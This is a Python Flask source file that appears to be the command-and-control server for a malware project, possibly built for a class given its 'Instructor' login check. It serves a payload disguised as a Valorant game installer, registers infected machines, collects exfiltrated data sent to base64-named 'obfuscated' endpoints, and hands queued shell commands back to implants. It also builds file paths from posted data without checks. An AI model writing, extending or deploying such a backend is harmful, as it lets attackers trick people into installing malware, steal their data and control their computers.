import functools
import os
import json

from user_agents import parse
from flask import (
    Blueprint, flash, g, redirect, render_template, request, session, url_for, send_from_directory, send_file
)


bp = Blueprint('nartan', __name__)
STATIC_DIR = os.getcwd()
EXFIL_DIR = "/root/MarcoPolo/polo/infected/"
CMD_FILE = "/root/MarcoPolo/polo/cmds.txt"

#Utils
def get_commands():
    cmds = []
    with open(CMD_FILE, "r") as f:
        for line in f.readlines():
            cmds.append(line.strip('\n'))

    open(CMD_FILE,"w").close()
    return json.dumps(cmds)

@bp.route('/')
def index():
    return render_template('warning.html')

@bp.route('/home', methods=['POST'])
def home():
    name = request.form['key']
    if name == "Instructor":
        return render_template('index.html')
    
    return('', 204)


@bp.route('/download_page')
def download_page():
    # Find OS from User-Agent
    usrA = parse(request.user_agent.string)
    print(usrA.os.family.lower())
    name="gavin"
    return render_template('download.html', name=name, os_fam=usrA.os.family.lower())

@bp.route('/download')
def download():
    print("Sending Valorant Installer")
    return send_file(STATIC_DIR + "/static/bin/install.sh", as_attachment=True)

@bp.route('/TW9yZ2VuCg')
def TW9yZ2VuCg():
    print("Sending File")
    return send_file(STATIC_DIR + "/static/bin/polo", as_attachment=True)
    
#Obfuscated endpoint for first contact
@bp.route('/ZGlyawo', methods=['POST'])
def ZGlyawo():
    #only thing that should be coming through this endpoint is a string along the lines of this
    #Marks-iMac.local, vps258357, Mark-PC, etc.
    post_data = request.get_data().decode('utf-8')
    path = EXFIL_DIR + post_data
    if not os.path.exists(path):
        os.mkdir(path)
    
    print("Made Dir: %s" % (EXFIL_DIR + post_data))
    return('',204)

@bp.route('/U2FtbXkK', methods=['GET'])
def U2FtbXkK():
    return send_file(STATIC_DIR + "/static/enum.sh", as_attachment=True)

#Obfuscated endpoint for exfil
@bp.route('/aGF0c3UK', methods=['POST'])
def aGF0c3UK():
    op = 'w'
    post_data = request.get_data().decode('utf-8')
    dirPath = post_data[0:post_data.find(':')]
    post_data = post_data[(len(dirPath)+ 1):]
    with open(EXFIL_DIR + dirPath + "/exfil.info", "a+") as f:
        f.write(post_data + "\n")

    return('', 204)

#Obfuscated endpoint for retrieval
@bp.route('/R1JOQ2hlZXRhaAo', methods=['GET'])
def R1JOQ2hlZXRhaAo():
    data = get_commands()
    return (data)


@bp.route('/aboutus')
def about_us():
    return render_template('about_us.html')
